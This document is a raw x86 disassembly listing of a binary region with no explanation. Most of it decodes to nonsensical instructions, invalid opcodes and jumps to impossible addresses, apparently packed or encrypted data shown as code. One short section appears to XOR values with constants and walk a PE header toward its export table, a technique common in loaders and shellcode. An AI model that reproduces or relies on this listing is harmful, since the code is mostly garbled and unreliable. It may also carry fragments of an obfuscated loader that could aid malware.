  40ee46:	mov    eax,0x3c6f170a
  40ee4b:	dec    esp
  40ee4c:	out    dx,al
  40ee4d:	add    bl,BYTE PTR [ebp+0x3f]
  40ee50:	cli    
  40ee51:	ror    DWORD PTR [edi],1
  40ee53:	cmp    bl,dh
  40ee55:	mov    cl,BYTE PTR fs:[esi+0x64]
  40ee59:	adc    al,0x9
  40ee5b:	xlat   BYTE PTR ds:[ebx]
  40ee5c:	fst    DWORD PTR [esi-0x58]
  40ee5f:	loope  0x40eec1
  40ee61:	fld    TBYTE PTR [eax+0xd]
  40ee64:	add    ebx,eax
  40ee66:	(bad)  
  40ee67:	in     al,0xcd
  40ee69:	and    BYTE PTR [ecx-0xa],dh
  40ee6c:	cli    
  40ee6d:	dec    eax
  40ee6e:	fidivr DWORD PTR [esi]
  40ee70:	sbb    eax,0x71fd297b
  40ee75:	mov    ecx,0x1602e382
  40ee7a:	enter  0xad1a,0x4c
  40ee7e:	mov    fs,ecx
  40ee80:	(bad)  
  40ee81:	gs adc ah,ah
  40ee84:	mov    ch,BYTE PTR [edi]
  40ee86:	sbb    al,BYTE PTR [edi+0x30]
  40ee89:	jbe    0x40ee25
  40ee8b:	sbb    DWORD PTR [ebx],esi
  40ee8d:	aaa    
  40ee8e:	push   eax
  40ee8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee90:	repz jnp 0x40ee1a
  40ee93:	xchg   edi,eax
  40ee94:	dec    esi
  40ee95:	stos   BYTE PTR es:[edi],al
  40ee96:	sub    ebx,DWORD PTR [eax+0x5c]
  40ee99:	mov    WORD PTR [eax+0x4a],es
  40ee9c:	push   edx
  40ee9d:	or     al,0x37
  40ee9f:	jmp    0x40eec5
  40eea1:	(bad)
  40eea4:	mov    eax,0x77b18cca
  40eea9:	mov    ah,0x73
  40eeab:	jl     0x40eed1
  40eead:	xor    eax,0xaee7115f
  40eeb2:	xor    BYTE PTR [edi+0xe],al
  40eeb5:	test   al,0x94
  40eeb7:	sbb    eax,0x9ec5fae
  40eebc:	(bad)  
  40eebd:	jae    0x40ee62
  40eebf:	mov    al,0x77
  40eec1:	push   edx
  40eec2:	xor    cl,BYTE PTR [edi+0x38]
  40eec5:	adc    BYTE PTR [ebp+ebp*8-0x5f],0xae
  40eeca:	icebp  
  40eecb:	inc    esp
  40eecc:	sbb    BYTE PTR [ebx+esi*8],al
  40eecf:	jns    0x40eefc
  40eed1:	lods   eax,DWORD PTR ds:[esi]
  40eed3:	push   ebp
  40eed4:	xlat   BYTE PTR ds:[ebx]
  40eed6:	xor    edx,DWORD PTR [eax]
  40eed8:	in     eax,0xc1
  40eeda:	call   0xbbcbf950
  40eedf:	leave  
  40eee0:	aaa    
  40eee1:	cmp    DWORD PTR [esi-0xe],esi
  40eee4:	mov    dl,0x65
  40eee6:	or     cl,BYTE PTR [edx+0x16]
  40eee9:	sub    eax,0x4e2aeeb4
  40eeee:	mov    al,ds:0x1588275d
  40eef3:	xor    ch,BYTE PTR [ecx+edx*1+0x3550b20d]
  40eefa:	mov    ebx,0xd37e9a30
  40eeff:	jmp    0x3db04cd7
  40ef04:	call   DWORD PTR ds:0x7d25362c
  40ef0a:	xchg   esp,ebp
  40ef0c:	or     al,0x8a
  40ef0e:	ret    0x72af
  40ef11:	pop    ebp
  40ef12:	inc    esi
  40ef13:	pop    ebx
  40ef14:	loope  0x40ef84
  40ef16:	aas    
  40ef17:	in     eax,0x9
  40ef19:	les    edi,FWORD PTR [esi-0x39]
  40ef1c:	mov    DWORD PTR [edi+0x7c7532b1],edi
  40ef22:	sub    BYTE PTR [esi-0x10],dh
  40ef25:	addr16 add eax,0x5593c719
  40ef2b:	(bad)  
  40ef2c:	shr    ebx,cl
  40ef2e:	add    DWORD PTR [esi+eiz*1-0x6c],edx
  40ef32:	add    BYTE PTR [ecx+0x8],dh
  40ef35:	add    BYTE PTR [edx],0xaa
  40ef38:	imul   edi,ebp,0x615cd670
  40ef3e:	push   cs
  40ef3f:	ror    BYTE PTR [edi+0xe],cl
  40ef42:	sub    esp,DWORD PTR [esi+0x42]
  40ef45:	int    0xa7
  40ef47:	push   ecx
  40ef48:	imul   edx,DWORD PTR [eax-0x474cc0da],0xffffff96
  40ef4f:	in     eax,dx
  40ef50:	test   eax,0x46991d0c
  40ef55:	mov    ds:0xdf39d542,al
  40ef5a:	pushf  
  40ef5b:	pop    esi
  40ef5c:	mov    ds:0x1763e5aa,al
  40ef61:	jp     0x40ef58
  40ef63:	and    eax,0x98670afb
  40ef68:	jecxz  0x40ef69
  40ef6a:	pop    ds
  40ef6b:	repz les edi,FWORD PTR [ecx]
  40ef6e:	mov    eax,0x4b0e9c90
  40ef73:	or     al,0xf9
  40ef75:	in     eax,0x41
  40ef77:	xchg   edx,eax
  40ef78:	hlt    
  40ef79:	test   al,0x45
  40ef7b:	js     0x40ef15
  40ef7d:	mov    ah,BYTE PTR [eax-0x34acac21]
  40ef83:	cmp    eax,DWORD PTR [edi]
  40ef85:	xchg   DWORD PTR [ecx-0x38],eax
  40ef88:	adc    al,0x2f
  40ef8a:	test   dl,ch
  40ef8c:	or     al,0x92
  40ef8e:	into   
  40ef8f:	cld    
  40ef90:	jb     0x40efbe
  40ef92:	fucom  st(2)
  40ef94:	arpl   WORD PTR [ebx+edi*4],ax
  40ef97:	add    al,BYTE PTR fs:[edi-0x7d35fa1]
  40ef9e:	sbb    bl,BYTE PTR [edi+eiz*4+0x3a]
  40efa2:	lock jne 0x40f01e
  40efa5:	sar    edx,cl
  40efa7:	(bad)  
  40efa8:	imul   ah
  40efaa:	std    
  40efab:	jne    0x40ef89
  40efad:	fwait
  40efae:	nop
  40efaf:	adc    BYTE PTR [esi],cl
  40efb1:	cmc    
  40efb2:	add    BYTE PTR ds:0x59ceb631,dl
  40efb8:	mov    bl,0x9a
  40efba:	repnz mov bl,0xf4
  40efbd:	lods   eax,DWORD PTR ds:[esi]
  40efbe:	daa    
  40efbf:	mul    edi
  40efc1:	aam    0x47
  40efc3:	loop   0x40ef92
  40efc5:	outs   dx,DWORD PTR ds:[esi]
  40efc6:	stos   BYTE PTR es:[edi],al
  40efc7:	call   0xd8d3:0x94fbb304
  40efce:	fild   QWORD PTR [eax+0x72ad1273]
  40efd4:	ret    0x2933
  40efd7:	mov    bl,0x4a
  40efd9:	sub    esp,DWORD PTR [ebx-0x669ae935]
  40efdf:	jmp    0x3b4a:0x1fa541e
  40efe6:	mov    ds:0x8e6fadbe,eax
  40efeb:	das    
  40efec:	shl    edi,0x85
  40efef:	cmp    esi,DWORD PTR [ebx-0x74]
  40eff2:	lahf   
  40eff3:	pusha  
  40eff4:	int    0x32
  40eff6:	ja     0x40f05d
  40eff8:	mov    DWORD PTR [ebx],ebp
  40effa:	sti    
  40effb:	push   ss
  40effc:	daa    
  40effd:	push   edi
  40effe:	repz mov eax,0xe84e822b
  40f004:	dec    edi
  40f005:	mov    esi,0xf91c51f9
  40f00a:	retf   0x6626
  40f00d:	add    BYTE PTR [ebx+0x7e],ah
  40f010:	xor    al,0xdf
  40f012:	inc    ecx
  40f013:	push   es
  40f014:	pop    esp
  40f015:	mov    eax,0x2a45ca1a
  40f01a:	jb     0x40f055
  40f01c:	sbb    bl,dl
  40f01e:	push   edi
  40f01f:	xor    ecx,DWORD PTR [ebp-0x9efd52f]
  40f025:	popf   
  40f026:	into   
  40f027:	dec    eax
  40f028:	stc    
  40f029:	mov    BYTE PTR [esi],0xf0
  40f02c:	push   ds
  40f02d:	rol    DWORD PTR [eax+0x27c979a2],1
  40f033:	push   edx
  40f034:	adc    BYTE PTR [edx+0x30],0xce
  40f038:	out    dx,al
  40f039:	adc    DWORD PTR [edi+0x66],ebp
  40f03c:	cs rcl ah,1
  40f03f:	mov    bl,0x9c
  40f041:	imul   esp,DWORD PTR [esi+0x64eb7bf1],0xffffffed
  40f048:	aaa    
  40f049:	push   0x11
  40f04b:	mov    eax,ds:0xd30349e
  40f050:	cmc    
  40f051:	and    eax,0xd98c5e50
  40f056:	add    al,0x72
  40f058:	push   ecx
  40f059:	cvttps2pi mm6,QWORD PTR [ebp+0x1c]
  40f05d:	js     0x40f0af
  40f05f:	mov    ch,0xee
  40f061:	adc    al,0x47
  40f063:	add    ch,dh
  40f065:	mov    ecx,0x3ed2ae1c
  40f06a:	mov    eax,0x10ad140d
  40f06f:	or     BYTE PTR [esi],al
  40f071:	pop    ds
  40f072:	mov    bh,0xd0
  40f074:	(bad)  
  40f075:	jle    0x40f06e
  40f077:	push   ebp
  40f078:	cmp    ebp,DWORD PTR [esi+0x6d]
  40f07b:	push   es
  40f07c:	and    BYTE PTR [edi+0x1d],cl
  40f07f:	push   ebp
  40f080:	sti    
  40f081:	adc    DWORD PTR [ebx-0x57],edx
  40f084:	ins    BYTE PTR es:[edi],dx
  40f085:	xchg   esi,eax
  40f086:	out    0x88,eax
  40f088:	jmp    0xa20c:0xfc72cf8
  40f08f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f090:	mov    al,0xa1
  40f092:	and    al,0xa8
  40f094:	addr16 icebp 
  40f096:	inc    ebx
  40f097:	std    
  40f098:	push   ss
  40f099:	sti    
  40f09a:	(bad)  
  40f09b:	and    BYTE PTR [esi-0x276906c],ah
  40f0a1:	sahf   
  40f0a2:	lods   eax,DWORD PTR ds:[esi]
  40f0a3:	test   eax,0xb1207e7c
  40f0a8:	sub    dl,BYTE PTR [edx+0x1d]
  40f0ab:	out    0x2b,eax
  40f0ad:	mov    cl,0xe0
  40f0af:	pop    edi
  40f0b0:	or     BYTE PTR [ebx+eiz*2],bl
  40f0b3:	ja     0x40f044
  40f0b5:	push   cs
  40f0b6:	jmp    0x2e3c:0x6611e902
  40f0bd:	es call 0x9537:0x76a0d77a
  40f0c5:	imul   esi,DWORD PTR [esi+ecx*2+0x4c9f0fd3],0x428463d1
  40f0d0:	lods   eax,DWORD PTR gs:[esi]
  40f0d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d3:	adc    DWORD PTR [edx-0x2d8f6f28],ebp
  40f0d9:	add    BYTE PTR [eax-0x30ed9ea5],bl
  40f0df:	or     BYTE PTR [edx+0x587197c3],dl
  40f0e5:	lock jmp 0xd878:0xeee2b1be
  40f0ed:	pusha  
  40f0ee:	loopne 0x40f077
  40f0f0:	adc    dl,BYTE PTR [ebx+0x63456615]
  40f0f6:	cdq    
  40f0f7:	sub    BYTE PTR [ecx*1+0x3a886be5],bl
  40f0fe:	mov    bl,0x85
  40f100:	push   0xf6778a07
  40f105:	push   ecx
  40f106:	shl    DWORD PTR [eax],0x62
  40f109:	enter  0x4bbd,0x7
  40f10d:	das    
  40f10e:	nop
  40f10f:	mov    bh,0x1e
  40f111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f112:	mov    al,ds:0xbe4a2795
  40f117:	and    BYTE PTR [esi+0x751f14b0],cl
  40f11d:	and    al,0xe2
  40f11f:	xchg   bh,cl
  40f121:	fs mov ecx,eax
  40f124:	xor    eax,eax
  40f126:	shr    edx,0x2
  40f129:	or     edx,DWORD PTR [ebp+0x14]
  40f12c:	mov    DWORD PTR [ebp+0x10],eax
  40f12f:	mov    eax,DWORD PTR [ebx]
  40f131:	shl    ecx,0x1e
  40f134:	xor    ecx,0xc0000000
  40f13a:	mov    DWORD PTR [ebp-0x64],edx
  40f13d:	mov    edx,DWORD PTR [ebx+0x4]
  40f140:	xor    eax,0xba699573
  40f145:	mov    DWORD PTR [ebp+0x14],ecx
  40f148:	mov    ecx,0x9c0a89d8
  40f14d:	xor    edx,ecx
  40f14f:	shrd   eax,edx,0x2
  40f153:	or     eax,DWORD PTR [ebp+0x10]
  40f156:	shr    edx,0x2
  40f159:	mov    DWORD PTR [ebp-0x70],eax
  40f15c:	mov    eax,edx
  40f15e:	or     eax,DWORD PTR [ebp+0x14]
  40f161:	mov    DWORD PTR [ebp-0x5c],edx
  40f164:	mov    DWORD PTR [ebp-0x6c],eax
  40f167:	mov    eax,DWORD PTR [ebp-0x70]
  40f16a:	cmp    DWORD PTR [ebp-0x68],eax
  40f16d:	jne    0x40f17f
  40f173:	mov    eax,DWORD PTR [ebp-0x6c]
  40f176:	cmp    DWORD PTR [ebp-0x64],eax
  40f179:	je     0x40fcce
  40f17f:	mov    eax,DWORD PTR [ebp+0x8]
  40f182:	mov    edx,DWORD PTR [ebp+0xc]
  40f185:	mov    edx,DWORD PTR [ebp-0x4]
  40f188:	mov    edx,DWORD PTR [edx+0x3c]
  40f18b:	lea    eax,[edx+eax*8+0x78]
  40f18f:	mov    edx,DWORD PTR [ebp-0x4]
  40f192:	mov    eax,DWORD PTR [edx+eax*1]
  40f195:	mov    DWORD PTR [ebp-0x24],eax
  40f198:	jmp    0x40f722
  40f19d:	mov    al,ds:0x187ff383
  40f1a2:	jle    0x40f1c4
  40f1a4:	sub    BYTE PTR [eax-0x5457b743],cl
  40f1aa:	ins    BYTE PTR es:[edi],dx
  40f1ab:	pop    edx
  40f1ac:	outs   dx,BYTE PTR ds:[esi]
  40f1ad:	mov    ch,0x86
  40f1af:	push   ss
  40f1b0:	push   ss
  40f1b1:	cmp    eax,0x63161604
  40f1b6:	pop    edx
  40f1b7:	cmc    
  40f1b8:	ss pop eax
  40f1ba:	dec    ebx
  40f1bb:	push   ds
  40f1bc:	mov    ds:0x9e4d5803,al
  40f1c1:	sti    
  40f1c2:	adc    edi,DWORD PTR [ebp+0x5cc72f92]
  40f1c8:	outs   dx,DWORD PTR ds:[esi]
  40f1c9:	int3   
  40f1ca:	mov    DWORD PTR [edx-0x7f21b492],0x7c5754ca
  40f1d4:	pop    ebx
  40f1d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1d6:	loop   0x40f245
  40f1d8:	ret    
  40f1d9:	xchg   edi,eax
  40f1da:	rcr    DWORD PTR [ecx-0x63],0xee
  40f1de:	les    ebp,FWORD PTR [edi-0x2d1de28b]
  40f1e4:	mov    edi,DWORD PTR [edx-0x16982a6]
  40f1ea:	mov    bh,0x70
  40f1ec:	pop    esp
  40f1ed:	mov    dh,bl
  40f1ef:	and    BYTE PTR [ebx-0x2],cl
  40f1f2:	dec    ebp
  40f1f3:	cli    
  40f1f4:	mov    bl,0x2c
  40f1f6:	jge    0x40f261
  40f1f8:	test   al,0x42
  40f1fa:	std    
  40f1fb:	pop    es
  40f1fc:	loopne 0x40f20d
  40f1fe:	inc    edx
  40f1ff:	push   0xb16eed92
  40f204:	fisub  WORD PTR [ebp-0x6b]
  40f207:	mov    BYTE PTR es:[eax-0x5d86bcc2],bh
  40f20e:	sbb    dl,BYTE PTR [edi+0x7d6793a5]
  40f214:	loopne 0x40f1f6
  40f216:	addr16 je 0x40f1c6
  40f219:	sub    BYTE PTR [ebx],bl
  40f21b:	popa   
  40f21c:	aas    
  40f21d:	and    BYTE PTR [edi+0x4537a946],dl
  40f223:	jb     0x40f273
  40f225:	xlat   BYTE PTR ds:[ebx]
  40f226:	mov    bl,0xac
  40f228:	ret    
  40f229:	mov    al,ds:0x1f0e8540
  40f22e:	dec    esi
  40f22f:	xchg   DWORD PTR [esi-0x5e],eax
  40f232:	mov    bl,0x89
  40f234:	sub    eax,0x7c394db4
  40f239:	lds    ecx,FWORD PTR [edi]
  40f23b:	popf   
  40f23c:	enter  0xdca0,0x5
  40f240:	xchg   ecx,eax
  40f241:	xor    BYTE PTR [ebx],ah
  40f243:	scas   al,BYTE PTR es:[edi]
  40f244:	fcomp  QWORD PTR ds:0x745003d9
  40f24a:	pop    ds
  40f24b:	dec    esp
  40f24c:	call   0x6a8b62e1
  40f251:	pushf  
  40f252:	dec    esp
  40f253:	xlat   BYTE PTR ds:[ebx]
  40f254:	pop    ss
  40f255:	or     BYTE PTR [esi+ebp*1],al
  40f258:	push   edi
  40f259:	mov    eax,ds:0xadc0e22
  40f25e:	pop    ds
  40f25f:	sahf   
  40f260:	jmp    0x9952:0xa58b914c
  40f267:	xchg   ebx,eax
  40f268:	add    ebp,DWORD PTR [edi+0x55]
  40f26b:	xchg   BYTE PTR [edi],al
  40f26d:	pop    ebp
  40f26e:	(bad)  
  40f26f:	or     DWORD PTR [esi+0x333393cb],ecx
  40f275:	inc    ebx
  40f276:	or     eax,0xd0302470
  40f27b:	add    BYTE PTR [esp+esi*1-0x80],bl
  40f27f:	aad    0x24
  40f281:	fild   DWORD PTR [eax+0x3]
  40f284:	and    al,0xf2
  40f286:	lods   al,BYTE PTR ds:[esi]
  40f287:	(bad)  
  40f288:	repz inc ebx
  40f28a:	jecxz  0x40f245
  40f28c:	add    eax,0xed762281
  40f291:	mov    ah,0xee
  40f293:	and    esi,0xffffffd2
  40f296:	add    eax,0x549d6ac5
  40f29b:	test   eax,0xd68b085c
  40f2a0:	xor    ebp,DWORD PTR ds:0x7cea399d
  40f2a6:	jmp    0x40f245
  40f2a8:	inc    ebx
  40f2a9:	push   es
  40f2aa:	or     ebx,esp
  40f2ac:	push   edx
  40f2ad:	and    eax,0x9b0e448a
  40f2b2:	mov    edx,0xa2b8b89a
  40f2b7:	xor    BYTE PTR [ebx+0x24],al
  40f2ba:	jge    0x40f251
  40f2bc:	xchg   esi,eax
  40f2bd:	repz es pop ebx
  40f2c0:	test   BYTE PTR [edi-0x6767df97],dl
  40f2c6:	xchg   cl,dh
  40f2c8:	push   ds
  40f2c9:	jmp    0x40f270
  40f2cb:	sti    
  40f2cc:	outs   dx,BYTE PTR ds:[esi]
  40f2cd:	inc    eax
  40f2ce:	shr    ah,1
  40f2d0:	test   BYTE PTR [esi],dl
  40f2d2:	jmp    0x40f2f6
  40f2d4:	popf   
  40f2d5:	in     al,dx
  40f2d6:	je     0x40f2e7
  40f2d8:	or     BYTE PTR ds:[edx],0xe
  40f2dc:	hlt    
  40f2dd:	fstp   DWORD PTR [esi]
  40f2df:	cld    
  40f2e0:	mov    eax,0xdec192a
  40f2e5:	pop    ebx
  40f2e6:	jno    0x40f29a
  40f2e8:	dec    edx
  40f2e9:	int    0x1
  40f2eb:	pop    es
  40f2ec:	out    dx,eax
  40f2ed:	xchg   ebx,eax
  40f2ee:	jecxz  0x40f317
  40f2f0:	in     eax,dx
  40f2f1:	lea    ecx,[ebx+eax*1-0x158d2ca3]
  40f2f8:	push   0xf2c8f0e9
  40f2fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2fe:	add    eax,0x6c963c91
  40f303:	push   ecx
  40f304:	xchg   esp,eax
  40f305:	sub    al,0xb
  40f307:	or     esi,eax
  40f309:	dec    esp
  40f30a:	(bad)  
  40f30b:	sbb    cl,BYTE PTR [ecx-0x2e4553e0]
  40f311:	lods   al,BYTE PTR ds:[esi]
  40f312:	mov    ebp,0xe847d111
  40f317:	std    
  40f318:	add    DWORD PTR [edi],esi
  40f31a:	pop    edx
  40f31b:	add    al,0x4
  40f31d:	scas   al,BYTE PTR es:[edi]
  40f31e:	imul   edi,DWORD PTR ds:0xf0000710,0x5140b449
  40f328:	dec    edx
  40f329:	sahf   
  40f32a:	adc    al,0xe2
  40f32c:	fcomp  QWORD PTR [edi]
  40f32e:	mov    edx,0xbe515de2
  40f333:	sub    al,0xd2
  40f335:	and    al,0x8c
  40f337:	sbb    BYTE PTR [ebx],bl
  40f339:	push   edx
  40f33a:	mov    esi,0xb73b6a2c
  40f33f:	fst    QWORD PTR [ebx-0x5e2ac4fe]
  40f345:	or     dh,BYTE PTR [ebp+0x67ab4076]
  40f34b:	xor    ebp,DWORD PTR [esi+0x20]
  40f34e:	push   ecx
  40f34f:	sbb    dh,BYTE PTR [ecx]
  40f351:	ja     0x40f2ea
  40f353:	dec    esi
  40f354:	dec    BYTE PTR [ecx-0x9b5fecf]
  40f35a:	aaa    
  40f35b:	pop    edi
  40f35c:	cwde   
  40f35d:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40f35f:	sub    al,0xc5
  40f361:	fwait
  40f362:	cli    
  40f363:	cdq    
  40f364:	pop    ss
  40f365:	in     eax,0xb5
  40f367:	xchg   DWORD PTR ds:0x716ad39d,esp
  40f36d:	mov    DWORD PTR [ebp+0x31],ebp
  40f370:	mov    ebp,0xee4d8e8b
  40f375:	das    
  40f376:	hlt    
  40f377:	add    eax,0x944498ed
  40f37c:	mov    esp,0xca154e17
  40f381:	es and al,0x35
  40f384:	cmc    
  40f385:	repz mov ebp,0xcdd36c94
  40f38b:	fnstsw WORD PTR [eax+0x22]
  40f38e:	or     al,ah
  40f390:	out    dx,al
  40f391:	or     al,0x39
  40f393:	adc    dl,bh
  40f395:	xchg   ebp,eax
  40f396:	add    eax,0x509fe99a
  40f39b:	jae    0x40f3b6
  40f39d:	mov    ah,0x46
  40f39f:	push   es
  40f3a0:	es xor BYTE PTR cs:[esi],ah
  40f3a4:	aas    
  40f3a5:	mov    DWORD PTR [eax+0x27736e7f],eax
  40f3ab:	repz ror ecx,cl
  40f3ae:	jmp    0x40f3bc
  40f3b0:	fimul  DWORD PTR [edi]
  40f3b2:	(bad)  
  40f3b3:	out    dx,al
  40f3b4:	popf   
  40f3b5:	add    BYTE PTR [edi-0x6a],dl
  40f3b8:	add    eax,DWORD PTR [esi-0x31]
  40f3bb:	push   esi
  40f3bc:	(bad)  
  40f3bd:	or     dh,BYTE PTR [esi-0x5e093425]
  40f3c3:	pop    ds
  40f3c4:	rcl    DWORD PTR [ebx+0x5b],1
  40f3c7:	sub    DWORD PTR [edx-0x3e],eax
  40f3ca:	jnp    0x40f35a
  40f3cc:	mov    ecx,0xc4604ae7
  40f3d1:	arpl   WORD PTR [edi+edi*4+0x7ea5f862],bp
  40f3d8:	push   esi
  40f3d9:	adc    dh,BYTE PTR [ebx+0x409a7ad8]
  40f3df:	or     ecx,esp
  40f3e1:	sub    eax,0x51d857e
  40f3e6:	xchg   ecx,eax
  40f3e7:	xchg   edx,eax
  40f3e8:	cmp    esi,DWORD PTR [edx-0xa]
  40f3eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3ec:	inc    ecx
  40f3ed:	add    ch,bh
  40f3ef:	stos   BYTE PTR es:[edi],al
  40f3f0:	das    
  40f3f1:	loop   0x40f3a7
  40f3f3:	jno    0x40f3c9
  40f3f5:	dec    eax
  40f3f6:	dec    ebp
  40f3f7:	add    cl,dl
  40f3f9:	aad    0x9b
  40f3fb:	in     eax,0xa3
  40f3fd:	fbstp  TBYTE PTR [ebp-0x3f]
  40f400:	test   eax,0x99bdf51
  40f405:	and    DWORD PTR [edi],ebp
  40f407:	jnp    0x40f39c
  40f409:	pop    edx
  40f40a:	bnd js 0x40f488
  40f40d:	rol    esp,1
  40f40f:	retf   0x8919
  40f412:	mov    eax,0x5b70e68
  40f417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f418:	mov    eax,ds:0x95651599
  40f41d:	shr    dh,0xad
  40f420:	jecxz  0x40f3ed
  40f422:	dec    BYTE PTR [edx*1+0x40577a5c]
  40f429:	xor    al,0x76
  40f42b:	or     eax,0x705ae87a
  40f430:	or     al,0xd1
  40f432:	(bad)  
  40f433:	pop    eax
  40f434:	add    al,0xf6
  40f436:	sub    al,al
  40f438:	adc    esp,DWORD PTR [edi]
  40f43a:	mov    al,ds:0x647bccf8
  40f43f:	test   al,0xc6
  40f441:	rcl    BYTE PTR gs:[ebx-0x222fdcec],1
  40f448:	bound  esi,QWORD PTR ds:0x95c4c9ad
  40f44e:	fwait
  40f44f:	in     eax,0x6c
  40f451:	or     cl,BYTE PTR [edi+0x22]
  40f454:	data16 aad 0x80
  40f457:	jp     0x40f480
  40f459:	jle    0x40f40a
  40f45b:	test   al,0x26
  40f45d:	sub    eax,0xb47bc315
  40f462:	outs   dx,BYTE PTR ds:[esi]
  40f463:	nop
  40f464:	adc    cl,bh
  40f466:	ffree  st(1)
  40f468:	mov    ecx,DWORD PTR [edx]
  40f46a:	adc    al,0x84
  40f46c:	inc    edx
  40f46d:	jae    0x40f48d
  40f46f:	in     al,0x83
  40f471:	cmp    al,0xf1
  40f473:	xor    ah,BYTE PTR [esi-0x44086988]
  40f479:	cmp    dh,BYTE PTR [ebp+0x50]
  40f47c:	push   edi
  40f47d:	adc    al,0x75
  40f47f:	repnz fstp QWORD PTR [esi]
  40f482:	xlat   BYTE PTR ds:[ebx]
  40f483:	adc    eax,0x6e73c72c
  40f488:	lea    edx,[ebx]
  40f48a:	mov    ebx,0xef06302c
  40f48f:	fidiv  DWORD PTR [ebp-0x1d1d5680]
  40f495:	jae    0x40f513
  40f497:	mov    eax,ds:0x25ce0c9b
  40f49c:	pushf  
  40f49d:	je     0x40f456
  40f49f:	and    DWORD PTR [edi-0x3],ebp
  40f4a2:	es cmp ebp,edx
  40f4a5:	es mov ebp,0x8e5dc12e
  40f4ab:	das    
  40f4ac:	addr16 popa 
  40f4ae:	push   edi
  40f4af:	out    dx,al
  40f4b0:	jmp    0x969619c6
  40f4b5:	retf   0xd9a0
  40f4b8:	in     al,0xd4
  40f4ba:	sbb    al,0x41
  40f4bc:	rol    BYTE PTR [bp+0x42],0xb2
  40f4c1:	and    BYTE PTR [ebx-0x30],ch
  40f4c4:	jnp    0x40f4a1
  40f4c6:	fstp   QWORD PTR [eax-0x658bc02c]
  40f4cc:	jge    0x40f4e0
  40f4ce:	adc    BYTE PTR [edi-0x3bdc756e],bh
  40f4d4:	jge    0x40f4e4
  40f4d6:	cmp    bh,BYTE PTR [ebx]
  40f4d8:	test   DWORD PTR [edi+eiz*8],edx
  40f4db:	rcl    DWORD PTR [ecx],1
  40f4dd:	aaa    
  40f4de:	or     eax,0x293b6409
  40f4e3:	mov    WORD PTR [ecx],?
  40f4e5:	sbb    BYTE PTR [eax+0x75a50a22],dl
  40f4eb:	mov    BYTE PTR [eax],ah
  40f4ed:	jge    0x40f47c
  40f4ef:	jl     0x40f4f0
  40f4f1:	xchg   edx,eax
  40f4f2:	sub    al,0x68
  40f4f4:	mov    edi,edx
  40f4f6:	sbb    eax,0x53d7f0de
  40f4fb:	or     DWORD PTR ds:[ebp-0x53f6b887],edx
  40f502:	mov    bl,0x46
  40f504:	inc    DWORD PTR ds:0xced01c6f
  40f50a:	rol    BYTE PTR [esp+ebx*1-0x4c4a8f4d],0xce
  40f512:	les    edx,FWORD PTR [esi]
  40f514:	push   0x1c
  40f516:	mov    edi,0x212bb9ac
  40f51b:	inc    ebx
  40f51c:	xchg   esi,eax
  40f51d:	es mov edi,0x7443f501
  40f523:	xchg   ecx,eax
  40f524:	mov    cl,0xbc
  40f526:	ja     0x40f4ea
  40f528:	pop    esp
  40f529:	adc    BYTE PTR [esi+ecx*8+0x5dd127b2],cl
  40f530:	mov    al,ah
  40f532:	lds    eax,FWORD PTR [ebp+0x2d]
  40f535:	imul   ebx,DWORD PTR [ebx-0x5f67f41e],0x27
  40f53c:	cmp    DWORD PTR [ebx+0x40e200a1],0x1
  40f543:	or     DWORD PTR ds:0xb3659b70,0xffffffa1
  40f54a:	jns    0x40f520
  40f54c:	scas   al,BYTE PTR es:[edi]
  40f54d:	mov    al,ds:0xab302c45
  40f552:	stos   DWORD PTR es:[edi],eax
  40f553:	dec    DWORD PTR [edi]
  40f555:	inc    edx
  40f556:	xchg   esi,eax
  40f557:	mov    edi,0x38b17192
  40f55c:	int    0x93
  40f55e:	dec    ebx
  40f55f:	jg     0x40f4ee
  40f561:	sbb    ah,bl
  40f563:	jmp    0x8f4119a9
  40f568:	or     ah,BYTE PTR [ebp+edx*8-0x27]
  40f56c:	or     al,0xda
  40f56e:	in     eax,0x3d
  40f570:	sub    esp,eax
  40f572:	icebp  
  40f573:	jns    0x40f593
  40f575:	sub    eax,0x2eea69db
  40f57a:	pop    ebp
  40f57b:	in     al,0xc7
  40f57d:	or     ebx,ecx
  40f57f:	call   0xf93aeaf9
  40f584:	add    cl,cl
  40f586:	out    dx,eax
  40f587:	stc    
  40f588:	cmp    ecx,DWORD PTR [esi]
  40f58a:	and    BYTE PTR [eax-0x21c09345],0x3c
  40f591:	retf   
  40f592:	jb     0x40f607
  40f594:	rol    BYTE PTR [ebx+ecx*8-0x4ca52441],cl
  40f59b:	dec    esi
  40f59c:	jmp    0xf393:0xa136e5ee
  40f5a3:	(bad)  
  40f5a4:	jecxz  0x40f545
  40f5a6:	pop    edi
  40f5a7:	aad    0x25
  40f5a9:	addr16 xchg edx,eax
  40f5ab:	sti    
  40f5ac:	rcr    BYTE PTR [edx+0x39a3ceb4],cl
  40f5b2:	retf   0x764f
  40f5b5:	xchg   ebx,eax
  40f5b6:	leave  
  40f5b7:	mov    cs,WORD PTR [ebp+edx*1-0x7c4ad81f]
  40f5be:	ja     0x40f583
  40f5c0:	xor    dh,ch
  40f5c2:	mov    eax,0xd2750f4c
  40f5c7:	clc    
  40f5c8:	jmp    0xe3e9c563
  40f5cd:	and    al,0x48
  40f5cf:	and    BYTE PTR [esi+0x433a46d7],dl
  40f5d5:	dec    ecx
  40f5d6:	cwde   
  40f5d7:	and    cl,BYTE PTR [eax+0x7bfd5e17]
  40f5dd:	xchg   edx,eax
  40f5de:	jnp    0x40f651
  40f5e0:	div    DWORD PTR [eax]
  40f5e2:	inc    edx
  40f5e3:	mov    esi,0x39bdab82
  40f5e8:	sbb    ebp,edi
  40f5ea:	test   edx,0xc61766c3
  40f5f0:	mov    bl,0xcd
  40f5f2:	mov    dh,0xfd
  40f5f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5f5:	dec    esp
  40f5f6:	loop   0x40f59e
  40f5f8:	ret    
  40f5f9:	xor    ebp,ecx
  40f5fb:	lods   eax,DWORD PTR ds:[esi]
  40f5fc:	xchg   DWORD PTR [ecx+0x2ef045ac],eax
  40f602:	lds    edx,FWORD PTR [eax-0x54]
